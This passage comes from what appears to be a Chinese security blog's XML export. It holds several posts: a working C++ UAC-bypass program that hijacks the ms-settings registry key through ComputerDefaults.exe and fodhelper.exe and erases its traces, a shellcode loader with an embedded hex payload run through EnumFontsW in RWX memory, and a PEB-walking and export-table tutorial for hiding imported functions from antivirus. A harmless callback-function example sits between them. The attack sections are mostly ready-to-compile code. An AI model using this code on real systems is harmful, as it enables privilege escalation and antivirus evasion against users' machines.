+这里我们的代码，建立在找到了某一个exe程序可以bypassUAC的前提下，依然以C:\Windows\System32\ComputerDefaults.exe来举例子
+
+### 代码逻辑
+1. 创建（或打开）注册表中的子项，这里打开子项“HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\Shell\\Open\\command”
+2. 写入注册表项的默认值，值为你要设定的程序
+3. 写入注册表项的DelegateExecute值，值可以不设
+4. 创建一个C:\Windows\System32\ComputerDefaults.exe的进程，用于启动ComputerDefaults.exe
+5. 删除我们添加的Software\\Classes\\ms-settings\\Shell\\Open\\command，不留痕迹
+
+具体代码如下：
+```C++
+#include <stdio.h>
+#include <Windows.h>
+
+int bypassuac(LPCSTR filePath) {
+	if (filePath == NULL) {
+		printf("please enter your file path!");
+		return 0;
+	}
+
+	HKEY hKey;
+
+	// 1、创建或打开注册表中的子项
+	LONG result1 = RegCreateKeyA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\Shell\\Open\\command", &hKey);
+	if (result1 != ERROR_SUCCESS) {
+		printf("create key fail~");
+		return 0;
+	}
+	else {
+		printf("create key success\n");
+	}
+
+	// 2、写入注册表项的默认值
+	LONG result2 = RegSetValueExA(hKey, NULL, 0, REG_SZ, (BYTE*)filePath, strlen(filePath) + 1024);
+	if (result2 != ERROR_SUCCESS) {
+		printf("set key fail~\n");
+		return 0;
+	}
+	else {
+		printf("set key success\n");
+	}
+
+	// 3、写入注册表项的DelegateExecute值
+	LONG result3 = RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ, (BYTE*)"", sizeof(""));
+	if (result3 != ERROR_SUCCESS) {
+		printf("set key DelegateExecute fail~\n");
+		return 0;
+	}
+	else {
+		printf("set key DelegateExecute success\n");
+	}
+
+	// 4、创建一个C:\Windows\System32\ComputerDefaults.exe的进程
+	STARTUPINFOA si;
+	PROCESS_INFORMATION pi;
+
+	BOOL success = CreateProcessA("C:\\Windows\\System32\\cmd.exe", (LPSTR)"/c C:\\Windows\\System32\\ComputerDefaults.exe", NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
+	if (success) {
+		printf("CreateProcess success！\n");
+	}
+	else {
+		DWORD dwError = GetLastError();
+		printf("CreateProcess fail, error_num：%d\n", dwError);
+	}
+
+	// 6、需要先睡眠1秒，让第4步先完成，再进行第5步；如果不睡眠，第5步会比第4步先执行
+	Sleep(1000);
+
+	// 5、删除我们添加的Software\\Classes\\ms-settings\\Shell\\Open\\command
+	if (RegDeleteTreeA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings") == ERROR_SUCCESS) {
+		printf("delete success\n");
+	}
+	else {
+		printf("delete fail\n");
+	}
+
+
+}
+
+int main(int argc, char* argv[]) {
+
+	if (argc != 2) {
+		printf("lost paramater\neg: %s C:\\Windows\\System32\\cmd.exe\n", argv[0]);
+	}
+	else {
+		bypassuac(argv[1]);
+	}
+
+	
+}
+
+```
+效果：
+
+![](https://s3.hedgedoc.org/demo/uploads/415e7b2d-582f-44ac-913f-26e8dd3b34ae.png)
+
+## 已知测试的exe
+
+### C:\Windows\System32\fodhelper.exe
+```C++
+#include <stdio.h>
+#include <Windows.h>
+
+int bypassuac(LPCSTR filePath) {
+	if (filePath == NULL) {
+		printf("please enter your file path!");
+		return 0;
+	}
+
+	HKEY hKey;
+
+	// 1、创建或打开注册表中的子项
+	LONG result1 = RegCreateKeyA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\Shell\\Open\\command", &hKey);
+	if (result1 != ERROR_SUCCESS) {
+		printf("create key fail~");
+		return 0;
+	}
+	else {
+		printf("create key success\n");
+	}
+
+	// 2、写入注册表项的默认值
+	LONG result2 = RegSetValueExA(hKey, NULL, 0, REG_SZ, (BYTE*)filePath, strlen(filePath) + 1024);
+	if (result2 != ERROR_SUCCESS) {
+		printf("set key fail~\n");
+		return 0;
+	}
+	else {
+		printf("set key success\n");
+	}
+
+
+	// 3、写入注册表项的DelegateExecute值
+	LONG result3 = RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ, (BYTE*)"", sizeof(""));
+	if (result3 != ERROR_SUCCESS) {
+		printf("set key DelegateExecute fail~\n");
+		return 0;
+	}
+	else {
+		printf("set key DelegateExecute success\n");
+	}
+
+
+	// 4、创建一个C:\Windows\System32\fodhelper.exe的进程
+	STARTUPINFOA si;
+	PROCESS_INFORMATION pi;
+
+	BOOL success = CreateProcessA("C:\\Windows\\System32\\cmd.exe", (LPSTR)"/c C:\\Windows\\System32\\fodhelper.exe", NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
+	if (success) {
+		printf("CreateProcess success！\n");
+	}
+	else {
+		DWORD dwError = GetLastError();
+		printf("CreateProcess fail, error_num：%d\n", dwError);
+	}
+
+	// 6、需要先睡眠1秒，让第4步先完成，再进行第5步；如果不睡眠，第5步会比第4步先执行
+	Sleep(1000);
+
+
+	// 5、删除我们添加的Software\\Classes\\ms-settings\\Shell\\Open\\command
+	if (RegDeleteTreeA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings") == ERROR_SUCCESS) {
+		printf("delete success\n");
+	}
+	else {
+		printf("delete fail\n");
+	}
+
+
+}
+
+int main(int argc, char* argv[]) {
+
+	if (argc != 2) {
+		printf("lost paramater\neg: %s C:\\Windows\\System32\\cmd.exe\n", argv[0]);
+	}
+	else {
+		bypassuac(argv[1]);
+	}
+
+	
+}
+```
+### ...以此类推
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+]]></content>
+      <categories>
+        <category>代码</category>
+      </categories>
+      <tags>
+        <tag>免杀</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>回调函数</title>
+    <url>/2024/03/26/%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0/</url>
+    <content><![CDATA[# 简介
+主要特征，是将一个函数作为一个参数传递给另外一个函数
+
+# 好处
+允许在某个事件发生时调用它。通常，回调函数用于实现自定义行为，以便在特定事件发生时执行。
+
+# 实现流程
+1. 定义一个“回调函数类型”
+2. 定义一个“回调函数”，“回调函数”需要与“回调函数类型”的参数和返回值是一个类型
+3. “回调函数”被某个函数调用
+
+# 代码实现
+```C++
+#include <cstdio>
+#include <Windows.h>
+
+//定义一个回调函数类型
+typedef void (*CallbackFunction)(LPCSTR somthing);
+
+//回调函数（经验）
+void myCallBackFunction1(LPCSTR something) {
+	printf("经验：%s\n",something);
+}
+
+//回调函数（金币）
+void myCallBackFunction2(LPCSTR something) {
+	printf("金币：%s\n", something);
+}
+
+//回调函数（经验）
+void myCallBackFunction3(LPCSTR something) {
+	printf("金币：%s\n", something);
+}
+
+//调用回调函数的  函数（击败敌人）
+int gogogo(CallbackFunction fun, LPCSTR word) {
+	fun(word);
+	return 0;
+}
+
+int main(int argc, char* argv[]) {
+	printf("战斗开始\n");
+	Sleep(1000);
+	printf("====================================================================\n");
+	printf("战斗结束，你成功击败敌人，获取了：\n\n");
+	gogogo(myCallBackFunction1, "+300\n");
+	gogogo(myCallBackFunction2, "+50\n");
+	gogogo(myCallBackFunction3, "破损的单手剑\n");
+
+	return 0;
+}
+```
+
+![](https://s3.hedgedoc.org/demo/uploads/3f505d5d-3f49-48cb-b2c1-c51b468191aa.png)
+]]></content>
+      <categories>
+        <category>代码</category>
+      </categories>
+      <tags>
+        <tag>C++</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>隐藏导入表</title>
+    <url>/2024/03/26/%E9%9A%90%E8%97%8F%E5%AF%BC%E5%85%A5%E8%A1%A8/</url>
+    <content><![CDATA[# 一、GetProcAddress
+```c++
+#include <iostream>
+#include <cstring>
+#include <string>
+#include <vector>
+#include <Windows.h>
+
+typedef LPVOID(WINAPI* MyVA)(
+    LPVOID lpAddress,
+    SIZE_T dwSize,
+    DWORD  flAllocationType,
+    DWORD  flProtect
+    );
+
+typedef int (WINAPI* MyEF)(
+    HDC           hdc,
+    LPCWSTR       lpFaceName,
+    FONTENUMPROCW lpFontEnumProc,
+    LPARAM        lParam
+    );
+
+int main() {
+    MyVA myva = (MyVA)GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "VirtualAlloc");
+    MyEF myef = (MyEF)GetProcAddress(GetModuleHandleW(L"gdi32.dll"), "EnumFontsW");
+
+    char nox_shellcode[] = "fc4883e4f0e8c0000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d08b80880000004885c074674801d0508b4818448b40204901d0e35648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e957ffffff5d48ba0100000000000000488d8d0101000041ba318b6f87ffd5bbf0b5a25641baa695bd9dffd54883c4283c067c0a80fbe07505bb4713726f6a00594189daffd563616c632e65786500";
+    std::vector<char> shellcode;  // 初始化为全零，用于存储转义序列形式
+
+    // 将每两个字符转换为对应的 ASCII 字符
+    for (size_t i = 0; i < strlen(nox_shellcode); i += 2) {
+        std::string hex = std::string(nox_shellcode + i, 2); //每次取两个字符，即1个16位进制数
+        int num = std::stoi(hex, nullptr, 16); //将16位进制数转化为10进制整数
+        char ch = static_cast<char>(num); //将10进制整数转化为对应的字符
+        shellcode.push_back(ch); //将字符添加到mem数组中
+    }
+
+    LPVOID mem = myva(NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    memcpy(mem, shellcode.data(), shellcode.size());
+
+    HDC hdc = GetDC(NULL);
+    myef(hdc, NULL, (FONTENUMPROCW)mem, NULL);
+
+    VirtualFree(mem, 0, MEM_RELEASE);
+
+    return 0;
+}
+
+```
+![](https://s3.hedgedoc.org/demo/uploads/d016c25e-f030-4d4d-adaa-c78b0a4185e6.png)
+
+效果：
+
+![](https://s3.hedgedoc.org/demo/uploads/794f0b42-b08b-4796-be60-06d9343988ab.png)
+
+查看导入表：
+
+![](https://s3.hedgedoc.org/demo/uploads/ebce4dd1-7ac4-44f6-ba25-86ea1c848b08.png)
+
+
+没发现VirtualAlloc和EnumFontsW函数，但是存在GetProcAddress和GetModuleHandleW两个参数，也是危险的，只能说是半隐藏，能骗骗小白
+
+![](https://s3.hedgedoc.org/demo/uploads/fb8bd2b3-55ba-4166-8fb3-d03b1abc2313.png)
+
+# 二、汇编+C++隐藏
+
+## 1、简述
+一般写加载器，都会用到VirtualAlloc、CrteateThread、LoadLibrary等函数，这都被杀软标记为了马子特征
+为了规避这个问题，只有在内存中找到函数地址然后再使用
+
+## 2、寻找kernel.dll
+下面用windbg进行调试
+32位于64位环境下的PEB地址偏移有所不同，下面是32位环境记录，用kernel.dll举例子
+
+每一个进程中至少有一个线程，每一个线程都有一个TEB结构，TEB的地址用fs:[0]来表示
+
+1. 在0x030这个地址，有一个指针指向PEB结构，PEB是进程记录自身信息的一个结构
+2. 在PEB的0x00c偏移有一个_PEB_LDR_DATA结构
+3. 在_PEB_LDR_DATA的偏移0x014是InMemoryOrderModuleList，就是dll的加载链表（说人话就是InMemoryOrderModuleList保存了你加载了哪些dll）
+
+那么我们就可以定位kernel.dll了，方法如下：
+1. 定位PEB
+2. 在PEB中找到_PE_LDR_DATA
+3. 在_PE_LDR_DATA中找到InInitializationorderModuleList
+4. 从InInitializationorderModuleList找到kernel.dll
+
+这里是用的是32位的Proc.exe
+
+### I、查看teb详细结构
+```
+dt -r1 _teb
+```
+![](https://s3.hedgedoc.org/demo/uploads/2a020b1e-aac8-468b-94b2-66eba4a2fdee.png)
+
+可以看到，teb偏移0x030即为peb
+
+### II、查看peb详细结构
+```
+dt -r1 _peb
+```
+
+![](https://s3.hedgedoc.org/demo/uploads/0eddb555-c857-4ca4-abb5-82a7e54744fd.png)
+
+可以看到，peb偏移0x00c即为Ldr
+
+#### A、peb原型
+微软给出的peb原型：https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb
+
+```C++
+typedef struct _PEB {
+  BYTE                          Reserved1[2];
+  BYTE                          BeingDebugged;
+  BYTE                          Reserved2[1];
+  PVOID                         Reserved3[2];
+  PPEB_LDR_DATA                 Ldr;
+  PRTL_USER_PROCESS_PARAMETERS  ProcessParameters;
+  PVOID                         Reserved4[3];
+  PVOID                         AtlThunkSListPtr;
+  PVOID                         Reserved5;
+  ULONG                         Reserved6;
+  PVOID                         Reserved7;
+  ULONG                         Reserved8;
+  ULONG                         AtlThunkSListPtr32;
+  PVOID                         Reserved9[45];
+  BYTE                          Reserved10[96];
+  PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine;
+  BYTE                          Reserved11[128];
+  PVOID                         Reserved12[1];
+  ULONG                         SessionId;
+} PEB, *PPEB;
+
+```
+
+从原型中我们知道，Ldr其实是一个PEB_LDR_DATA类型
+
+![](https://s3.hedgedoc.org/demo/uploads/bf24cf3c-fc83-4e29-a348-bb738b97c1fd.png)
+
+### III、查找peb中Ldr具体位置
+```
+!peb
+```
+
+![](https://s3.hedgedoc.org/demo/uploads/e0646ae3-df15-40f4-bb09-08d8e7aab3f9.png)
+
+可以看到，Ldr地址为77a7cb00
+
+### IV、跟进Ldr分析
+
+```
+dt -r1 77a7cb00 _PEB_LDR_DATA
+```
+
+![](https://s3.hedgedoc.org/demo/uploads/3f0b8a78-d9eb-4cbf-9fb7-209745444ee5.png)
+
+上面我们说到，ldr是一个PEB_LDR_DATA类型
+
+#### A、PEB_LDR_DATA原型
+微软给出的PEB_LDR_DATA原型：	https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb_ldr_data
+
+```C++
+typedef struct _PEB_LDR_DATA {
+  BYTE       Reserved1[8];
+  PVOID      Reserved2[3];
+  LIST_ENTRY InMemoryOrderModuleList;
+} PEB_LDR_DATA, *PPEB_LDR_DATA;
+```
+
+第一个和第二个参数是保留给操作系统内部使用，第三个InMemoryOrderModuleList参数的给出的解释是：“双向链表的头部，包含进程加载的模块。列表中的每一项都是指向LDR_DATA_TABLE_ENTRY结构的指针”
+
+意思就是，InMemoryOrderModuleList是一个LDR_DATA_TABLE_ENTRY类型，且InMemoryOrderModuleList里面包含了已经加载到进程中的模块（pe文件，包括exe和dll等）
+
+而从我们的上面跟进到Ldr的结果来看，这个LDR_DATA_TABLE_ENTRY类型不止InMemoryOrderModuleList这一个
+
+![](https://s3.hedgedoc.org/demo/uploads/d6722832-c8e6-425a-a69d-77d5cbfd064b.png)
+
+以看到，还有其他两个，加起来共下面3个
+1. InLoadOrderModuleList
+2. InMemoryOrderModuleList
+3. InInitializationOrderModuleList
+下面我们直接分析第一个InLoadOrderModuleList
+偏移为0x00c
+地址为[ 0x1034078 - 0x1036e78 ]
+类型为LDR_DATA_TABLE_ENTRY
+
+#### B、LDR_DATA_TABLE_ENTRY原型
+微软给出的LDR_DATA_TABLE_ENTRY原型：https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb_ldr_data
+
+```C++
+typedef struct _LDR_DATA_TABLE_ENTRY {
+    PVOID Reserved1[2];
+    LIST_ENTRY InMemoryOrderLinks;
+    PVOID Reserved2[2];
+    PVOID DllBase;
+    PVOID EntryPoint;
+    PVOID Reserved3;
+    UNICODE_STRING FullDllName;
+    BYTE Reserved4[8];
+    PVOID Reserved5[3];
+    union {
+        ULONG CheckSum;
+        PVOID Reserved6;
+    };
+    ULONG TimeDateStamp;
+} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;
+```
+
+#### C、关于双向链表
+上面说到InLoadOrderModuleList、InMemoryOrderModuleList、InInitializationOrderModuleList是一个双向链表
+
+我们知道自行车的链条，其实就是又一节一节的链节构成，每一个链节的前端和后端都铆钉连着其他的链节，最后首尾相接。
+
+![](https://s3.hedgedoc.org/demo/uploads/c0eb2de8-2d36-4371-a302-d9c0e7d9f7bd.png)
+
+其实双向链表也是这个结构，只不过用地址连接
+1. Flink（Forward Link）指向链表中下一个节点的地址，即下一个加载的模块的 _LDR_DATA_TABLE_ENTRY 结构的地址
+2. Blink（Back Link）指向链表中上一个节点的地址，即上一个加载的模块的 _LDR_DATA_TABLE_ENTRY 结构的地址
+
+![](https://s3.hedgedoc.org/demo/uploads/28a2dfde-b8c3-447e-bb66-80ffd4ec56d0.png)
+
+什么，你问Flink和Blink在哪里？
+在PEB_LDR_DATA和LDR_DATA_TABLE_ENTRY里面就能看到
+
+![](https://s3.hedgedoc.org/demo/uploads/10610e36-ddf9-4305-86ca-36892c5baeba.png)
+
+![](https://s3.hedgedoc.org/demo/uploads/d9c8424b-f4a6-4c96-9648-3487b8f86d30.png)
+
+### V、分析InLoadOrderModuleList
+#### A、第1个InLoadOrderModuleList
+在上面分析Ldr我们知道了第1个InLoadOrderModuleList的地址为：0x00824078
+
+![](https://s3.hedgedoc.org/demo/uploads/6992d346-0498-4e40-9e53-bdca42117750.png)
+
+直接跟进到第1个InLoadOrderModuleList的地址
+
+```
+dt -r1 0x00824078 _LDR_DATA_TABLE_ENTRY
+```
+
+![](https://s3.hedgedoc.org/demo/uploads/cbd33fb2-331f-468a-97c0-97a55c295fbd.png)
+
+由上图所示，我们从第1个InLoadOrderModuleList中得到的信息如下
+1. 第2个InLoadOrderModuleList地址为0x00823f60
+2. 模块地址（DllBase）为0x009e0000
+3. 模块名称（BaseDllName）为ProC.exe
+
+#### B、第2个InLoadOrderModuleList
+
+```
+dt -r1 0x00823f60 _LDR_DATA_TABLE_ENTRY
+```
+
+![](https://s3.hedgedoc.org/demo/uploads/4cbd3037-a972-496d-b782-1e2e9f158ce1.png)
+
+由上图所示，我们从第2个InLoadOrderModuleList中得到的信息如下
+1. 第3个InLoadOrderModuleList地址为0x00824470
+2. 模块地址（DllBase）为0x77950000
+3. 模块名称（BaseDllName）为ntdll.dll
+
+#### C、第3个InLoadOrderModuleList
+
+```
+dt -r1 0x00824470 _LDR_DATA_TABLE_ENTRY
+```
+
+![](https://s3.hedgedoc.org/demo/uploads/e298541c-9c7b-4c5b-b1d6-73f1e8589eb5.png)
+
+由上图所示，我们从第3个InLoadOrderModuleList中得到的信息如下
+1. 第4个InLoadOrderModuleList地址为0x00824860
+2. 模块地址（DllBase）为0x76550000
+3. 模块名称（BaseDllName）为KERNEL32.DLL
+
+#### D、第4个InLoadOrderModuleList
+
+```
+dt -r1 0x00824860 _LDR_DATA_TABLE_ENTRY
+```
+
+![](https://s3.hedgedoc.org/demo/uploads/2cc9ff51-7423-4999-8e7b-1ee4f131a2cd.png)
+
+由上图所示，我们从第4个InLoadOrderModuleList中得到的信息如下
+1. 第5个InLoadOrderModuleList地址为0x00825c78
+2. 模块地址（DllBase）为0x76820000
+3. 模块名称（BaseDllName）为KERNELBASE.dll
+
+第五个
+第六个
+......
+以此类推，便可以知道后面加载的模块地址和名称
+不过一个一个得调，有点费眼睛
+
+
+#### E、小结
+
+从上面的分析来看，在pe文件中模块的加载顺序为：
+1. pe文件本体
+2. ntdll.dll
+3. KERNEL32.DLL
+4. KERNELBASE.dll
+5. ......
+所有的加载的dll地址都是在InLoadOrderModuleList偏移0x000处
+
+### VI、汇编代码
+#### A、获取KERNEL32地址-代码1
+
+```C++
+#include <Windows.h>
+#include <cstdio>
+
+int main() {
+
+	ULONG address;
+
+	__asm {
+		mov eax, fs: [0x030]; 进入peb
+		mov eax, [eax + 0x00c]; 进入Ldr
+		mov eax, [eax + 0x00c]; 进入第一个InLoadOrderModuleList，并获取第2个模块的Flink地址
+		mov eax, [eax + 0x000]; 进入第二个InLoadOrderModuleList，并获取第3个模块的Flink地址
+		mov eax, [eax + 0x000]; 进入第3个InLoadOrderModuleList，并获取第4个模块的Flink地址
+		mov eax, [eax + 0x018]; 从第3个InLoadOrderModuleList中的获取DllBase
+		mov address, eax;
+	}
+
+	HANDLE kerAddress = LoadLibrary(L"KERNEL32.dll");
+
+	printf("0x%x \n", address);
+	printf("0x%x \n", kerAddress);
+
+	return 0;
+}
+```
+
+![](https://s3.hedgedoc.org/demo/uploads/463fed05-b4ba-4490-8a6d-5a3dd7ff02fb.png)
+
+利用测试
+
+```C++
+#include <Windows.h>
+#include <cstdio>
+
+int main() {
+
+
+	ULONG address;
+
+	__asm {
+		mov eax, fs: [0x030]; 进入peb
+		mov eax, [eax + 0x00c]; 进入Ldr
+		mov eax, [eax + 0x00c]; 进入第一个InLoadOrderModuleList，并获取第2个模块的Flink地址
+		mov eax, [eax + 0x000]; 进入第二个InLoadOrderModuleList，并获取第3个模块的Flink地址
+		mov eax, [eax + 0x000]; 进入第3个InLoadOrderModuleList，并获取第4个模块的Flink地址
+		mov eax, [eax + 0x018]; 从第3个InLoadOrderModuleList中的获取DllBase
+		mov address, eax;
+	}
+
+	typedef void (WINAPI* getTime) (
+		LPSYSTEMTIME lpSystemTime
+		);
+	
+	getTime dwGetTime = (getTime)GetProcAddress((HMODULE)address, "GetLocalTime");//利用点
+	SYSTEMTIME localTime;
+	dwGetTime(&localTime);
+	printf("本地时间：%02d/%02d/%d %02d:%02d:%02d\n",
+		localTime.wMonth, localTime.wDay, localTime.wYear,
+		localTime.wHour, localTime.wMinute, localTime.wSecond);
+
+	return 0;
+}
+```
+
+![](https://s3.hedgedoc.org/demo/uploads/84bc1226-30cb-40e7-9ba9-ada3250a5133.png)
+
+#### B、获取KERNEL32地址-代码2
+
+```C++
+#include <Windows.h>
+#include <cstdio>
+
+typedef struct _PEB_LDR_DATA {
+	BYTE Reserved1[8];
+	PVOID Reserved2[3];
+	LIST_ENTRY InLoadOrderModuleList;
+	LIST_ENTRY InMemoryOrderModuleList;
+	LIST_ENTRY InInitializationOrderModuleList;
+} PEB_LDR_DATA, * PPEB_LDR_DATA;
+
+
+typedef struct _UNICODE_STRING {
+	USHORT Length;
+	USHORT MaximumLength;
+	PWSTR Buffer;
+}UNICODE_STRING, * PUNICODE_STRING;
+
+typedef struct _LDR_DATA_TABLE_ENTRY {
+	PVOID Reserved1[2];
+	LIST_ENTRY InMemoryOrderLinks;
+	PVOID Reserved2[2];
+	PVOID DllBase;
+	PVOID EntryPoint;
+	PVOID Reserved3;
+	UNICODE_STRING FullDllName;
+	UNICODE_STRING BaseDllName;
+	BYTE Reserved4[8];
+	PVOID Reserved5[3];
+	union {
+		ULONG CheckSum;
+		PVOID Reserved6;
+	};
+	ULONG TimeDateStamp;
+} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;
+
+void GetKernel32Addr() {
+	ULONG address;
+	__asm {
+		mov eax, fs: [0x030]		// PEB
+		mov eax, [eax + 0x00c]		//Ldr
+		mov eax, [eax + 0x00c]		//InLoadOrderModuleList
+		mov address, eax			//address是InLoadOrderModuleList地址，也是第一个_LDR_DATA_TABLE_ENTRY
+	}
+
+	PLIST_ENTRY pHead = (PLIST_ENTRY)address;
+	PLIST_ENTRY pFlink = pHead->Flink;
+
+	while (((PLDR_DATA_TABLE_ENTRY)pHead)->BaseDllName.Buffer != ((PLDR_DATA_TABLE_ENTRY)pFlink)->BaseDllName.Buffer) {
+		if (((PLDR_DATA_TABLE_ENTRY)pFlink)->DllBase != NULL && _wcsicmp(((PLDR_DATA_TABLE_ENTRY)pFlink)->BaseDllName.Buffer, L"KERNEL32.dll") == 0) {
+			printf("%ws	0x%x\n", ((PLDR_DATA_TABLE_ENTRY)pFlink)->BaseDllName.Buffer, ((PLDR_DATA_TABLE_ENTRY)pFlink)->DllBase);
+		}
+		pFlink = pFlink->Flink;
+	}
+}
+
+int main() {
+	GetKernel32Addr();
+	return 0;
+}
+```
+
+![](https://s3.hedgedoc.org/demo/uploads/ee5ac03f-0aa2-4ffe-be6a-456442439bfd.png)
+
+## 3、从kernel32.dll中寻找GetProcAddress函数
+拿dll来说吧，如果你写的一个dll里面的A函数需要被别的exe调用，你就必须得将A函数声明位导出函数
+而导出函数自然在导出表里面，可供查询
+下面是导出表在PE文件中的位置（倒推）：
+1. 导出表（_IMAGE_EXPORT_DIRECTORY）
+2. 数据目录表（_IMAGE_DATA_DIRECTORY）
+3. 可选映像头（_IMAGE_OPTIONAL_HEADER）
+4. NT头（_IMAGE_NT_HEADERS）
+5. DOS头（_IMAGE_DOS_HEADER）
+
+![](https://s3.hedgedoc.org/demo/uploads/804ec497-a5a5-429b-9d3d-63ca69caeae8.png)
+
+##
+DOS头中（_IMAGE_DOS_HEADER结构体），最后一个参数e_lfanew指向的是NT头（_IMAGE_NT_HEADERS结构）的地址
+偏移0x03c
+
+![](https://s3.hedgedoc.org/demo/uploads/c924ea8f-9132-44ab-8bdb-625aeff81575.png)
+
+NT头中（_IMAGE_NT_HEADERS结构），参数OptionalHeader指向的是可选映像头（_IMAGE_OPTIONAL_HEADER结构体）的地址
+偏移0x018
+
+![](https://s3.hedgedoc.org/demo/uploads/5a189ce1-1133-4ea4-99e2-c6c7dbbe1ae3.png)
+
+可选映像头（_IMAGE_OPTIONAL_HEADER结构体）中，参数DataDirectory指向的是数据目录表（_IMAGE_DATA_DIRECTORY结构体）的地址
+偏移0x060
+
+![](https://s3.hedgedoc.org/demo/uploads/be4a618c-78fd-4149-a9ca-718c3ab4500c.png)
+
+数据目录表（_IMAGE_DATA_DIRECTORY）中，
+下面继续用Windbg看看咋找kernel32.dll的导出表
+
+### I、KERNEL32.dll地址
+tips：后面因为重启了电脑，KERNEL32.dll的地址就发生了变化（0x76f20000）
+首先，找到了KERNEL32.DLL的地址为0x76f20000
+
+![](https://s3.hedgedoc.org/demo/uploads/6ddd2222-975c-4f7d-8ff3-eb22079af4ad.png)
+
+然后我们查看KERNEL32.dll的DOS头
+
+### II、KERNEL32.dll DOS头地址
+
+```
+dt -r1 0x76f20000 _IMAGE_DOS_HEADER
+```
+
+![](https://s3.hedgedoc.org/demo/uploads/8b7a0e15-2b77-4734-a291-4bc5e240f3b3.png)
+
+NT头（_IMAGE_NT_HEADERS）偏移在0x03c
+
+### III、KERNEL32.dll NT头地址
+
+```
+dt -r1 76f20000+0x03c _IMAGE_NT_HEADERS
+```
+
+![](https://s3.hedgedoc.org/demo/uploads/77efed12-1cb8-496f-a165-5d16240515c9.png)
+
+可选映像头（_IMAGE_OPTIONAL_HEADER）在偏移0x018
+
+### IV、KERNEL32.dl 可选映像头
+
+```
+dt -r1 76f20000+0x03c+0x018 _IMAGE_OPTIONAL_HEADER
+```
+
+![](https://s3.hedgedoc.org/demo/uploads/a813265e-9959-46ae-8648-3559ba33566f.png)
+
+数据目录表（_IMAGE_DATA_DIRECTORY）在偏移0x060处
+
+### V、KERNEL32.dl 数据目录表
+
+```
+dt -r1 76f20000+0x03c+0x018+0x060 _IMAGE_DATA_DIRECTORY
+```
+
+![](https://s3.hedgedoc.org/demo/uploads/483df9ea-29cc-4191-aa12-142f3eca634a.png)
+
+在IMAGE_DATA_DIRECTORY这个结构体中，只有VirtualAddress和Size两个成员
+这两个成员的含义比较简单
+1. VirtualAddress指定了数据块的相对虚拟地址(RVA)
+2. Size指定了该数据块的大小。
+其中共有16项成员，具体如下：
+```
+导出表（Export Table）
+导入表（Import Table）
+资源表（Resource Table）
+异常处理表（Exception Table）
+安全相关表（Certificate Table）
+重定位表（Base Relocation Table）
+调试信息表（Debugging Information Table）
+版权信息表（Architecture-Specific Data Table）
+全局指针寄存器表（Global Pointer Register Table）
+TLS表（Thread Local Storage Table）
+负载配置表（Load Configuration Table）
+网络地址转换表（Bound Import Table）
+导出地址表（Import Address Table）
+延迟加载导入表（Delay Import Table）
+COM运行时描述表（COM Runtime Descriptor Table）
+保留（Reserved）
+```
+
+其中导入表，导出表，重定位表，IAT表等等表比较重要
+而我们的导出表就在第1个位置
+但是呢，这里记录的是导出表的RVA（相对虚拟地址），所以我们要转化成FOA（文件偏移地址）才能在PE文件中查看
+FOA == RVA - BaseRVA + BaseFOA
+1. RVA 是要转化的相对虚拟地址。
+2. BaseRVA 是数据目录表中导出表项的RVA。
+3. BaseFOA 是数据目录表中导出表项的FOA。
+
+```C++
+typedef struct _IMAGE_EXPORT_DIRECTORY {
+    DWORD   Characteristics;
+    DWORD   TimeDateStamp;
+    WORD    MajorVersion;
+    WORD    MinorVersion;
+    DWORD   Name;
+    DWORD   Base;
+    DWORD   NumberOfFunctions;				//所有的导出函数的个数
+    DWORD   NumberOfNames;						//有名字的函数个数
+    DWORD   AddressOfFunctions;				//导出函数地址表的RVA
+    DWORD   AddressOfNames;						//导出函数名称表的RVA
+    DWORD   AddressOfNameOrdinals;  	//导出函数序号表的RVA
+
+} IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;
+```
+
+```C++
+#include <Windows.h>
+#include <cstdio>
+
+
+typedef struct _UNICODE_STRING {
+	USHORT Length;
+	USHORT MaximumLength;
+	PWSTR Buffer;
+}UNICODE_STRING, * PUNICODE_STRING;
+
+typedef struct _LDR_DATA_TABLE_ENTRY {
+	PVOID Reserved1[2];
+	LIST_ENTRY InMemoryOrderLinks;
+	PVOID Reserved2[2];
+	PVOID DllBase;
+	PVOID EntryPoint;
+	PVOID Reserved3;
+	UNICODE_STRING FullDllName;
+	UNICODE_STRING BaseDllName;
+	BYTE Reserved4[8];
+	PVOID Reserved5[3];
+	union {
+		ULONG CheckSum;
+		PVOID Reserved6;
+	};
+	ULONG TimeDateStamp;
+} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;
+
+ULONG getDllName() {
+	ULONG address;
+	__asm {
+		mov eax, fs: [0x030] // 进入PEB
+		mov eax, [eax + 0x00c] // 进入Ldr
+		mov eax, [eax + 0x00c] // 进入第一个InLoadOrderModuleList
+		mov address, eax
+	}
+	PLDR_DATA_TABLE_ENTRY Flink = (PLDR_DATA_TABLE_ENTRY)address;
+
+	PLIST_ENTRY ModuleList = (PLIST_ENTRY)Flink;
+	PLIST_ENTRY tou = ModuleList->Flink;
